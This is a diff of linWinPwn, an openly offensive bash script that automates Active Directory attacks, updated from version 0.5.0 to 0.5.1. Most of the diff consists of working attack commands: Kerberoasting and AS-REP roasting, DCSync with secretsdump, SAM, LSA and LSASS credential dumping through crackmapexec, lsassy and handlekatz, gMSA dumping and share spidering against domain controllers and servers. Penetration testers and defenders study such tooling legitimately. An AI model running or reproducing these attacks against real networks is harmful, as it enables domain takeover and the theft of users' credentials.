@@ -1,7 +1,7 @@
 #!/bin/bash
 # Title: linWinPwn
 # Author: lefayjey
-# Version: 0.5.0
+# Version: 0.5.1
 
 #Colors
 RED='\033[1;31m'
@@ -23,7 +23,11 @@ allservers_bool=true
 
 #Tools variables
 python=$(which python3)
-impacket_dir="/usr/local/bin"
+impacket_findDelegation=$(which findDelegation.py)
+impacket_GetUserSPNs=$(which GetUserSPNs.py)
+impacket_secretsdump=$(which secretsdump.py)
+impacket_GetNPUsers=$(which GetNPUsers.py)
+impacket_getTGT=$(which getTGT.py)
 bloodhound=$(which bloodhound-python)
 ldapdomaindump=$(which ldapdomaindump)
 crackmapexec=$(which crackmapexec)
@@ -37,9 +41,6 @@ scripts_dir="/opt/lwp-scripts"
 wordlists_dir="/opt/lwp-wordlists"
 donpapi_dir="$scripts_dir/DonPAPI-main"
 
-#pass_list="$wordlists_dir/rockyou.txt" #Non-Kali-variables
-#users_list="$wordlists_dir/xato-net-10-million-usernames.txt" #Non-Kali-variables
-
 print_banner () {
     echo -e "
        _        __        ___       ____                  
@@ -48,7 +49,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN} version 0.5.0
+      ${BLUE}linWinPwn: ${CYAN} version 0.5.1
       ${NC}https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -65,7 +66,7 @@ help_linWinPwn () {
     echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
     echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
     echo -e "-o/--output       Output directory (default: current dir)"
-    echo -e ""
+    echo -e "--ntp             Run NTP sync with target DC (positional argument: at the end)" 
     echo -e ""
     echo -e "${YELLOW}Example usages${NC}"
     echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain ${CYAN}(No password for anonymous login)${NC}" >&2;
@@ -88,6 +89,7 @@ while test $# -gt 0; do
             --Modules) modules="${2}"; shift;; #comma separated modules to run
             -o) output_dir="${2}"; shift;;
             --output) output_dir="${2}"; shift;;
+            --ntp) echo -e "${BLUE}[*] NTP sync with target DC... ${NC}"; sudo timedatectl set-ntp 0; sudo ntpdate ${dc_ip}; shift;;
             -h) help_linWinPwn; exit;;
             --help) help_linWinPwn; exit;;
             \?) echo -e "Unknown option: ${2}" >&2; exit 1;;
@@ -103,6 +105,8 @@ prepare (){
         echo -e "Use -h for help"
         exit 1
     fi
+
+    echo -e "${GREEN}[+] $(date)${NC}"
 
     if [ ! -f "${crackmapexec}" ] ; then
         echo -e "${RED}[-] Please ensure crackmapexec is installed and try again... ${NC}"
@@ -190,6 +194,7 @@ prepare (){
         argument_imp=" -hashes ${password} ${domain}/${user}"
         argument_donpapi=" -H ${password} ${domain}/${user}"
         argument_bhd="-u ${user}@${domain} --hashes ${password}"
+        argument_silenthd="-u ${user} --hashes ${password}"
         argument_windap="-d ${domain} -u ${user} --hash ${password}"
         argument_certipy="-u ${user}@${domain} -hashes ${password}"
         auth_string="${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
@@ -220,6 +225,7 @@ prepare (){
         argument_imp="${domain}/${user}:${password}"
         argument_donpapi="${domain}/${user}:${password}"
         argument_bhd="-u ${user}@${domain} -p ${password}"
+        argument_silenthd="-u ${user} -p ${password}"
         argument_windap="-d ${domain} -u ${user} -p ${password}"
         argument_certipy="-u ${user}@${domain} -p ${password}"
         argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
@@ -236,6 +242,7 @@ prepare (){
 
     mkdir -p ${output_dir}/Scans
     mkdir -p ${output_dir}/DomainRecon/BloodHound
+    mkdir -p ${output_dir}/DomainRecon/SilentHound
     mkdir -p ${output_dir}/DomainRecon/LDAPDump
     mkdir -p ${output_dir}/DomainRecon/ADCS
     mkdir -p ${output_dir}/Kerberos
@@ -261,23 +268,24 @@ dns_enum () {
     if [ ! -f "${adidnsdump}" ] ; then
         echo -e "${RED}[-] Please verify the installation of adidnsdump${NC}"
         echo -e ""
-    elif [ ! -f "${dns_records}" ]; then
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] adidnsdump requires credentials${NC}"
-        elif [ "${kerb_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets${NC}"
-        else
-            echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
-            ${adidnsdump} ${argument_ldapdns} --dns-tcp ${dc_ip}
-            mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
-            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 > ${servers_ip_list}
-            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 > ${dc_ip_list}
-            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 > ${dc_hostname_list}
-        fi
     else
-        echo -e "${YELLOW}[i] DNS dump found ${NC}"
+        echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
+        if [ ! -f "${dns_records}" ]; then
+            if [ "${nullsess_bool}" == true ] ; then
+                echo -e "${PURPLE}[-] adidnsdump requires credentials${NC}"
+            elif [ "${kerb_bool}" == true ] ; then
+                echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets${NC}"
+            else
+                ${adidnsdump} ${argument_ldapdns} --dns-tcp ${dc_ip}
+                mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
+                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 > ${servers_ip_list}
+                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 > ${dc_ip_list}
+                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 > ${dc_hostname_list}
+            fi
+        else
+            echo -e "${YELLOW}[i] DNS dump found ${NC}"
+        fi
     fi
-
     echo -e ""
 }
 
@@ -307,23 +315,24 @@ smb_scan () {
             grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
         fi
     fi
-    echo -e ""
 }
 
 bhd_enum () {
     if [ ! -f "${bloodhound}" ] ; then
         echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
-    elif [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ 2>/dev/null)" ] ; then
-        echo -e "${YELLOW}[i] BloodHound results found. ${NC}"
     else
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
+        echo -e "${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}"
+        if [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ 2>/dev/null)" ] ; then
+            echo -e "${YELLOW}[i] BloodHound results found. ${NC}"
         else
-            echo -e "${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}"
-            current_dir=$(pwd)
-            cd ${output_dir}/DomainRecon/BloodHound
-            ${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip
-            cd ${current_dir}
+            if [ "${nullsess_bool}" == true ] ; then
+                echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
+            else
+                current_dir=$(pwd)
+                cd ${output_dir}/DomainRecon/BloodHound
+                ${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip
+                cd ${current_dir}
+            fi
         fi
     fi
     echo -e ""
@@ -332,17 +341,19 @@ bhd_enum () {
 bhd_enum_dconly () {
     if [ ! -f "${bloodhound}" ] ; then
         echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
-    elif [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ 2>/dev/null)" ] ; then
-        echo -e "${YELLOW}[i] BloodHound results found. ${NC}"
     else
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
-        else 
-            echo -e "${BLUE}[*] BloodHound Enumeration using DCOnly${NC}"
-            current_dir=$(pwd)
-            cd ${output_dir}/DomainRecon/BloodHound
-            ${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip
-            cd ${current_dir}
+        echo -e "${BLUE}[*] BloodHound Users Enumeration (Null session) using DCOnly${NC}"
+        if [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ 2>/dev/null)" ] ; then
+            echo -e "${YELLOW}[i] BloodHound results found. ${NC}"
+        else
+            if [ "${nullsess_bool}" == true ] ; then
+                echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
+            else 
+                current_dir=$(pwd)
+                cd ${output_dir}/DomainRecon/BloodHound
+                ${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip
+                cd ${current_dir}
+            fi
         fi
     fi
     echo -e ""
@@ -367,6 +378,24 @@ ldapdomain_enum () {
         /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${output_dir}/DomainRecon/users_list_ldap_${dc_domain}.txt 2>&1
         /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_computers.grep 2>/dev/null | awk -F '\t' '{ print $3 }' | grep -v "dNSHostName" | sort -u > ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
         echo ${dc_FQDN} >> ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
+    fi
+    echo -e ""
+}
+
+silenthound_enum () {
+    if [ ! -f "${scripts_dir}/silenthound.py" ]; then
+        echo -e "${RED}[-] Please verify the location of silenthound${NC}"
+    else
+        echo -e "${BLUE}[*] SilentHound Enumeration${NC}"
+        if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
+            current_dir=$(pwd)
+            cd ${output_dir}/DomainRecon/SilentHound
+            ${python} ${scripts_dir}/silenthound.py ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast -o ${output_dir}/DomainRecon/SilentHound/${dc_domain} > ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt 2>/dev/null
+            cd ${current_dir}
+            echo -e "${GREEN}[+] SilentHound enumeration complete.${NC}"
+        else
+                echo -e "${PURPLE}[-] SilentHound does not support null sessions or kerberos tickets${NC}"
+        fi
     fi
     echo -e ""
 }
@@ -524,14 +553,14 @@ deleg_enum_cme () {
 }
 
 deleg_enum_imp () {
-    if [ ! -f "${impacket_dir}/findDelegation.py" ] ; then
+    if [ ! -f "${impacket_findDelegation}" ] ; then
         echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
     else
         echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] impacket requires credentials${NC}"
         else
-            ${python} ${impacket_dir}/findDelegation.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
+            ${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
             if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
                 echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
             fi
@@ -541,22 +570,24 @@ deleg_enum_imp () {
 }
 
 certi_py_enum () {
-    if [[ ! -f "${certi_py}" ]] && [[ ! -f "${impacket_dir}/getTGT.py)" ]] ; then
+    if [[ ! -f "${certi_py}" ]] && [[ ! -f "${impacket_getTGT}" ]] ; then
         echo -e "${RED}[-] Please verify the installation of certi.py and the location of getTGT.py${NC}"
-    elif [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
     else
         echo -e "${BLUE}[*] certi.py Enumeration${NC}"
-        if  [ "${kerb_bool}" == false ] ; then
-            current_dir=$(pwd)
-            cd ${output_dir}/Credentials
-            ${python} ${impacket_dir}/getTGT.py ${argument_imp} -dc-ip ${dc_ip}
-            cd ${current_dir}
-            export KRB5CCNAME="${output_dir}/Credentials/${user}.ccache"
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
+        else
+            if  [ "${kerb_bool}" == false ] ; then
+                current_dir=$(pwd)
+                cd ${output_dir}/Credentials
+                ${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}
+                cd ${current_dir}
+                export KRB5CCNAME="${output_dir}/Credentials/${user}.ccache"
+            fi
+            ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --class ca | tee ${output_dir}/DomainRecon/ADCS/certi.py_CA_output_${dc_domain}.txt
+            ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --class service | tee ${output_dir}/DomainRecon/ADCS/certi.py_CAServices_output_${dc_domain}.txt
+            ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --vuln --enabled | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
         fi
-        ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --class ca | tee ${output_dir}/DomainRecon/ADCS/certi.py_CA_output_${dc_domain}.txt
-        ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --class service | tee ${output_dir}/DomainRecon/ADCS/certi.py_CAServices_output_${dc_domain}.txt
-        ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --vuln --enabled | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
     fi
     echo -e ""
 }
@@ -564,15 +595,17 @@ certi_py_enum () {
 certipy_enum () {
     if [[ ! -f "${certipy}" ]] ; then
         echo -e "${RED}[-] Please verify the installation of certipy${NC}"
-    elif [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] certipy requires credentials${NC}"
     else
         echo -e "${BLUE}[*] Certipy Enumeration${NC}"
-        current_dir=$(pwd)
-        cd ${output_dir}/DomainRecon/ADCS
-        ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp 2>/dev/null | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
-        ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -scheme ldap | tee -a ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
-        cd ${current_dir}
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
+        else
+            current_dir=$(pwd)
+            cd ${output_dir}/DomainRecon/ADCS
+            ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp 2>/dev/null | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
+            ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -scheme ldap | tee -a ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
+            cd ${current_dir}
+        fi
     fi
     echo -e ""
 }
@@ -627,7 +660,7 @@ userpass_kerbrute_check () {
 }
 
 asrep_attack () {
-    if [ ! -f "${impacket_dir}/GetNPUsers.py" ]; then
+    if [ ! -f "${impacket_GetNPUsers}" ]; then
         echo -e "${RED}[-] GetNPUsers.py not found! Please verify the installation of impacket${NC}"
     else
         known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
@@ -641,11 +674,11 @@ asrep_attack () {
                 echo -e "${YELLOW}[i] No credentials for target domain provided. Using $users_list wordlist...${NC}"
                 users_scan_list=${users_list}
             fi
-            ${python} ${impacket_dir}/GetNPUsers.py "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
+            ${impacket_GetNPUsers} "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
             /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
         else
-            ${python} ${impacket_dir}/GetNPUsers.py ${argument_imp} -dc-ip ${dc_ip}
-            ${python} ${impacket_dir}/GetNPUsers.py ${argument_imp} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+            ${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip}
+            ${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
         fi
         if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
             echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
@@ -682,7 +715,7 @@ asreprc4_attack () {
 }
 
 kerberoast_attack () {
-    if [ ! -f "${impacket_dir}/GetUserSPNs.py" ]; then
+    if [ ! -f "${impacket_GetUserSPNs}" ]; then
         echo -e "${RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket${NC}"
     else
         if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ] ; then
@@ -691,11 +724,11 @@ kerberoast_attack () {
             echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
             asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
             if [ ! "${asrep_user}" == "" ]; then
-                ${python} ${impacket_dir}/GetUserSPNs.py -no-preauth ${asrep_user} -usersfile ${known_users_list} -dc-ip ${dc_ip} "${dc_domain}/" > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt 2>&1
+                ${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${known_users_list} -dc-ip ${dc_ip} "${dc_domain}/" > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt 2>&1
                 if grep -q 'error' ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt; then
                     echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                 else
-                    /bin/cat ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
+                    /bin/cat ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' | tee ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
                 fi
             else
                 echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. Run ASREPRoast attack and try again.${NC}"
@@ -703,8 +736,8 @@ kerberoast_attack () {
 
         else
             echo -e "${BLUE}[*] Kerberoast Attack${NC}"
-            ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain}
-            ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
+            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain}
+            ${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
             if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
                     echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
                 else
@@ -829,21 +862,39 @@ shares_cme () {
     echo -e ""
 }
 
+spider_cme_dc () {
+    echo -e "${BLUE}[*] Spidering Shares on DC using crackmapexec${NC}"
+    ${crackmapexec} smb ${target_dc} ${argument_cme} -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>/dev/null | tee ${output_dir}/Shares/cme_spider_dc_output${dc_domain}.txt 2>&1
+    echo -e ""
+}
+
+spider_cme () {
+    echo -e "${BLUE}[*] Spidering Shares on domain servers using crackmapexec ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        spider_cme_dc
+    else
+        smb_scan
+        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>/dev/null | tee ${output_dir}/Shares/cme_spider_output${dc_domain}.txt 2>&1
+    fi
+    echo -e ""
+}
+
 keepass_scan_dc () {
+    echo -e "${BLUE}[*] Search for KeePass-related files and process from DC${NC}"
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] keepass_discover requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Search for KeePass-related files and process from DC${NC}"
         ${crackmapexec} smb ${target_dc} ${argument_cme} -M keepass_discover 2>/dev/null | tee ${output_dir}/Shares/keepass_discover_dc_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
 
 keepass_scan () {
+    echo -e "${BLUE}[*] Search for KeePass-related files and process${NC}"
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] keepass_discover requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Search for KeePass-related files and process${NC}"
         if [ "${kerb_bool}" == true ]; then
             echo -e "${PURPLE}[-] Targeting DC only${NC}"
             keepass_scan_dc
@@ -865,41 +916,41 @@ laps_dump () {
 }
 
 gmsa_dump () {
+    echo -e "${BLUE}[*] gMSA Dump${NC}"
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] gMSA Dump${NC}"
         ${crackmapexec} ldap ${dc_ip} ${argument_cme} --gmsa | > ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
     fi
     echo -e ""
 }
 
 secrets_dump_dc () {
-    if [ ! -f "${impacket_dir}/secretsdump.py" ] ; then
+    if [ ! -f "${impacket_secretsdump}" ] ; then
         echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
     else
+        echo -e "${BLUE}[*] Performing DCSync using secretsdump${NC}"
         if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+            echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
         else
-            echo -e "${BLUE}[*] Performing DCSync using secretsdump${NC}"
-            ${python} ${impacket_dir}/secretsdump.py ${argument_imp}@${dc_ip} -just-dc | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
+            ${impacket_secretsdump} ${argument_imp}@${dc_ip} -just-dc | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
         fi
     fi
     echo -e ""
 }
 
 secrets_dump () {
-    if [ ! -f "${impacket_dir}/secretsdump.py" ] ; then
+    if [ ! -f "${impacket_secretsdump}" ] ; then
         echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
     else
+        echo -e "${BLUE}[*] Dumping credentials using secretsdump${NC}"
         if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] impacket requires credentials${NC}"
+            echo -e "${PURPLE}[-] secretsdump requires credentials${NC}"
         else
-            echo -e "${BLUE}[*] Dumping credentials using secretsdump${NC}"
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
-                ${python} ${impacket_dir}/secretsdump.py ${argument_imp}@${i} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
+                ${impacket_secretsdump} ${argument_imp}@${i} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -907,20 +958,20 @@ secrets_dump () {
 }
 
 sam_dump_dc () { 
+    echo -e "${BLUE}[*] Dumping SAM from DC using crackmapexec${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping SAM from DC using crackmapexec${NC}"
         ${crackmapexec} smb ${target_dc} ${argument_cme} --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
 
 sam_dump () {
+    echo -e "${BLUE}[*] Dumping SAM credentials${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping SAM credentials${NC}"
         if [ "${kerb_bool}" == true ]; then
             echo -e "${PURPLE}[-] Targeting DC only${NC}"
             sam_dump_dc
@@ -936,20 +987,20 @@ sam_dump () {
 }
 
 lsa_dump_dc () {
+    echo -e "${BLUE}[*] Dumping LSA secrets from DC using crackmapexec${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSA secrets from DC using crackmapexec${NC}"
         ${crackmapexec} smb ${target_dc} ${argument_cme} --lsa | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
 
 lsa_dump () {
+    echo -e "${BLUE}[*] Dumping LSA credentials${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSA credentials${NC}"
         if [ "${kerb_bool}" == true ]; then
             echo -e "${PURPLE}[-] Targeting DC only${NC}"
             lsa_dump_dc
@@ -965,20 +1016,20 @@ lsa_dump () {
 }
 
 lsassy_dump_dc () {
+    echo -e "${BLUE}[*] Dumping LSASS from DC using lsassy${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSASS from DC using lsassy${NC}"
         ${crackmapexec} smb ${target_dc} ${argument_cme} -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
 
 lsassy_dump () {
+    echo -e "${BLUE}[*] Dumping LSASS using lsassy${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSASS using lsassy${NC}"
         if [ "${kerb_bool}" == true ]; then
             echo -e "${PURPLE}[-] Targeting DC only${NC}"
             lsassy_dump_dc
@@ -994,20 +1045,20 @@ lsassy_dump () {
 }
 
 handlekatz_dump_dc () {
+    echo -e "${BLUE}[*] Dumping LSASS from DC using handlekatz${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSASS from DC using handlekatz${NC}"
         ${crackmapexec} smb ${target_dc} ${argument_cme} -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
 
 handlekatz_dump () {
+    echo -e "${BLUE}[*] Dumping LSASS using handlekatz${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSASS using handlekatz${NC}"
         if [ "${kerb_bool}" == true ]; then
             echo -e "${PURPLE}[-] Targeting DC only${NC}"
             handlekatz_dump_dc
@@ -1023,20 +1074,20 @@ handlekatz_dump () {
 }
 
